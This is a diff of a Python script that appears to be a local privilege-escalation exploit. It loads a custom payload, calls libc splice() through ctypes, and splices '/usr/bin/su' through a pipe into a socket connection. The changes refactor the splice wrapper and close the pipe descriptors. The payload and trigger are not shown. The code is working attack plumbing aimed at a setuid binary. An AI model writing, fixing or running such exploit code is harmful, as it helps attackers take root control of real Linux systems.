@@ -13,13 +13,12 @@ if len(sys.argv) == 2: # custom payload is specified
         print(f"Read in custom payload with size = {len(payload)} bytes")
         
 # pre-3.10 way of calling os.splice(...)
-SPLICE_F_MORE = 4
 libc = ctypes.CDLL("libc.so.6", use_errno=True)
 libc.splice.restype = ctypes.c_ssize_t
 libc.splice.argtypes = [ctypes.c_int, ctypes.POINTER(ctypes.c_int64), ctypes.c_int, ctypes.POINTER(ctypes.c_int64), ctypes.c_size_t, ctypes.c_uint]
 
 
-def splice(f, w, o, offset_src=None, offset_dst=None, flags=SPLICE_F_MORE):
+def splice(fd_in, fd_out, sz, offset_src=None, offset_dst=None):
     if offset_src is not None:
         c_off_in = ctypes.c_int64(offset_src)
         p_off_in = ctypes.byref(c_off_in)
@@ -32,7 +31,7 @@ def splice(f, w, o, offset_src=None, offset_dst=None, flags=SPLICE_F_MORE):
     else:
         p_off_out = None
 
-    ret = libc.splice(f, p_off_in, w, p_off_out, o, flags)
+    ret = libc.splice(fd_in, p_off_in, fd_out, p_off_out, sz, 0)
     if ret == -1:
         errno = ctypes.get_errno()
         raise OSError(errno, os.strerror(errno))
@@ -58,6 +57,9 @@ def send(fd, offset, chunk):
     print(f"'/usr/bin/su' -> pipe: {offset + 4} B xfered")
     os.splice(rd, conn.fileno(), offset + 4) if sys.version_info >= (3, 10) else splice(rd, conn.fileno(), offset + 4)
     print(f"pipe -> connection: {offset + 4} B xfered")
+
+    os.close(rd)
+    os.close(wr)
 
     try:
         '''
